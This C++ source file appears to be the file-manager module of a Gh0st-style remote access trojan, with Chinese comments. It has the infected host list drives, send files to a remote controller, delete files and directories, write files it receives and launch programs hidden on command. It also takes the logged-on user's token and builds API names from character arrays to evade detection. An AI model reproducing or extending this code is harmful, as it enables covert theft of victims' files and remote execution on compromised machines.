﻿// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "FileFinder.h"
#include "FileManager.h"
#include <LM.h>
#include <ShlObj.h>
#include <shellapi.h>
#include <Shlwapi.h>
#include "../zlib/zlib.h"  // 相对于Server目录  // 相对于Server目录
#include <vector>  

// ZIP文件格式结构定义  
#pragma pack(1)  
struct ZipLocalFileHeader {  
    DWORD signature;        // 0x04034b50  
    WORD version;           // 版本需要  
    WORD flags;             // 通用标志  
    WORD compression;       // 压缩方法  
    WORD modTime;           // 修改时间  
    WORD modDate;           // 修改日期  
    DWORD crc32;            // CRC32校验  
    DWORD compressedSize;   // 压缩后大小  
    DWORD uncompressedSize; // 原始大小  
    WORD filenameLength;    // 文件名长度  
    WORD extraLength;       // 扩展字段长度  
};  

struct ZipCentralDirEntry {  
    DWORD signature;        // 0x02014b50  
    WORD versionMade;       // 创建版本  
    WORD versionNeeded;     // 需要版本  
    WORD flags;             // 通用标志  
    WORD compression;       // 压缩方法  
    WORD modTime;           // 修改时间  
    WORD modDate;           // 修改日期  
    DWORD crc32;            // CRC32校验  
    DWORD compressedSize;   // 压缩后大小  
    DWORD uncompressedSize; // 原始大小  
    WORD filenameLength;    // 文件名长度  
    WORD extraLength;       // 扩展字段长度  
    WORD commentLength;     // 注释长度  
    WORD diskNumber;        // 磁盘号  
    WORD internalAttr;      // 内部属性  
    DWORD externalAttr;     // 外部属性  
    DWORD localHeaderOffset; // 本地头偏移  
};  

struct ZipEndOfCentralDir {  
    DWORD signature;        // 0x06054b50  
    WORD diskNumber;        // 磁盘号  
    WORD centralDirDisk;    // 中央目录磁盘号  
    WORD entriesOnDisk;     // 本磁盘条目数  
    WORD totalEntries;      // 总条目数  
    DWORD centralDirSize;   // 中央目录大小  
    DWORD centralDirOffset; // 中央目录偏移  
    WORD commentLength;     // 注释长度  
};  
#pragma pack()

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

enum
{
	COMMAND_COMPRESS_FILE_PARAM,
};

extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
extern bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd);

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_bIsWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &m_bIsWow64);
	m_hFileSend = INVALID_HANDLE_VALUE;
	m_hFileRecv = INVALID_HANDLE_VALUE;
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	PVOID OldValue = NULL;
	BOOL bRevert = FALSE;
	if (m_bIsWow64)
	{
		char AjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkA[]={'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64DisableWow64FsRedirectionT)(PVOID *OldValue);
		Wow64DisableWow64FsRedirectionT pWow64DisableWow64FsRedirection=(Wow64DisableWow64FsRedirectionT)MyGetProcAddressA(AjrFx,xTfkA);
		if (pWow64DisableWow64FsRedirection)
			bRevert = pWow64DisableWow64FsRedirection(&OldValue);
	}
	
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:			// 获取磁盘列表(文件列表)
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:			// 被控端删除单个文件
		DeleteFile((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:		// 被控端删除整个文件夹
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES:			// 上传文件, 对于控制端来说是下载文件, 控制端仅创建文件(空文件)
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE:				// 上传数据, 对于控制端来说是下载数据, 控制端将保存数据到之前创建的空文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:			// 被控端创建一个空的文件夹
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:			// 被控端重命名文件夹(文件)
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:					// 此处特殊
		StopTransfer(*&lpBuffer[1]);
		break;
	case COMMAND_SET_TRANSFER_MODE:		// 下载文件(对于控制端来说是上传文件)时的传输模式, 包含覆盖继传跳过等
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:				// 下载文件, 对于控制端来说是上传文件, 被控端仅创建文件(空文件)
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:				// 下载数据, 对于控制端来说是上传数据, 被控端将保存数据到之前创建的空文件
		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_OPEN_FILE_SHOW:		// 被控端以可见方式打开指定的文件(目录)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_SHOW);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:		// 被控端以隐藏方式打开指定的文件(目录)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_HIDE);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_HIDE);
		break;
	case COMMAND_COMPRESS_FILE_PARAM:	// 被控端用(WinRAR)压缩或解压指定的文件(目录)
		ExeCompress(lpBuffer + 1);
		break;
	case COMMAND_SEARCH_FILE:
		SearchFile(lpBuffer + 1);
		break;
	default:
		break;
	}
	
	if (bRevert)
	{
		char VjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkV[]={'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64RevertWow64FsRedirectionT)(PVOID OldValue);
		Wow64RevertWow64FsRedirectionT pWow64RevertWow64FsRedirection=(Wow64RevertWow64FsRedirectionT)MyGetProcAddressA(VjrFx,xTfkV);
		if (pWow64RevertWow64FsRedirection)
			pWow64RevertWow64FsRedirection(OldValue);
	}
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.
    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	char str175914[]={'\"','%','1','\0'};
	char str175947[]={'%','1','\0'};
	lpstrCat = strstr(strTemp, str175914);
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp,str175947);
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str142919[]={'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t','\0'};
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = str142919; 
	
	return CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char kbCfr[]={'I','m','p','e','r','s','o','n','a','t','e','L','o','g','g','e','d','O','n','U','s','e','r','\0'};
	typedef BOOL (WINAPI *ImpersonateLoggedOnUserT)(HANDLE hToken);
	ImpersonateLoggedOnUserT pImpersonateLoggedOnUser=(ImpersonateLoggedOnUserT)MyGetProcAddressA(AjrFx,kbCfr);
	
	HANDLE hToken = NULL;
	if (pWTSGetActiveConsoleSessionId && pWTSQueryUserToken && pImpersonateLoggedOnUser)
	{
		DWORD dwConsoleSessionId = pWTSGetActiveConsoleSessionId();
		if (pWTSQueryUserToken(dwConsoleSessionId, &hToken))
		{
//			if (pImpersonateLoggedOnUser(hToken))
				return hToken;
		}
	}
	return NULL;
}

UINT CFileManager::SendDriveList()
{
	char	DriveString[256];
	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
	BYTE	DriveList[2048];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	char	szUserName[UNLEN+1];
	DWORD	dwUserLen = UNLEN;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
		DriveList[1] = TRUE;
	else
		DriveList[1] = FALSE;
	
	HANDLE hTokenAcsi = ImpersonateLoggedOnUserWrapper();
//	SHGetSpecialFolderPath(NULL, (char *)&DriveList[1], CSIDL_DESKTOPDIRECTORY, FALSE);
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, hTokenAcsi, SHGFP_TYPE_CURRENT, (char *)&DriveList[2]);
//	RevertToSelf();
	CloseHandle(hTokenAcsi);
	
	for (DWORD dwOffset = 1 + 1 + lstrlen((char *)&DriveList[2]) + 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		
		// 计算磁盘大小
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		// 磁盘空间描述占去了8字节
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// 磁盘卷标名及磁盘类型
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}

UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*lpszSlash = NULL;
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	char str18010[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(strPath,str18010, lpszDirectory, lpszSlash);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	*lpList = TOKEN_FILE_LIST;
	
	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do 
	{
		// 动态扩展缓冲区
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// 文件属性 1 字节
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// 文件大小 8 字节
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpszDirectory, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				if (wfd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
					SetFileAttributes(strFile, FILE_ATTRIBUTE_NORMAL);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return false;
	}
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);
	
	if (m_hFileSend != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileSend);
	m_hFileSend = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hFileSend == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(m_hFileSend, &dwSizeHigh);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用
	// 构造数据包，发送文件长度(1字节token, 8字节大小, 文件名称, '\0')
	int		nPacketSize = lstrlen(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize->dwSizeHigh == -1 && pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}

	SetFilePointer(m_hFileSend, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，数据
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(m_hFileSend, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// 传送下一个文件
void CFileManager::UploadNext()
{
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	list <string>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer(TRUE);
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpPathName, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManager::StopTransfer(BOOL bIsUpload)
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	if (bIsUpload)
		SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);
	
	// 保存文件长度
	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;
	
	// 创建多层目录
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 传送下一个
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 1, &dwOffset, 4);
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);
	
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileRecv);
	m_hFileRecv = CreateFile(m_strCurrentProcessFileName,
		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	// 需要错误处理
	if (m_hFileRecv == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	//CloseHandle(m_hFileRecv); // 此处不要关闭, 以后还要用

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE		*pData;
	DWORD		dwBytesToWrite;
	DWORD		dwBytesWrite;
	int			nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	
	// 得到数据的偏移
	pData = lpBuffer + 8;
	pFileSize = (FILESIZE *)lpBuffer;
	
	// 得到数据在文件中的偏移
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	dwBytesToWrite = nSize - 8;
	
	SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	BOOL bRet = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
// 	if (bRet == FALSE)
// 		printf("文件写入失败");
	dwOffsetLow = 0; dwOffsetHigh = 0;
	dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
	//CloseHandle(m_hFileRecv);  // 此处不要关闭, 以后还要用
	// 为了比较，计数器递增
	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

